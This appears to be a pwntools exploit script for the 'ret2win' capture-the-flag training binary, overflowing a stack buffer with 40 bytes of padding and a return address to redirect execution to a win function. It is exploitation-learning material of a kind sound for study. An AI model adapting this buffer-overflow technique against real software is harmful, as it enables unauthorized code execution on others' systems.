from pwn import *

r = process('./ret2win')

payload = b'a' * 40

payload += p64(0x40075a)

r.sendline(payload)

r.interactive()
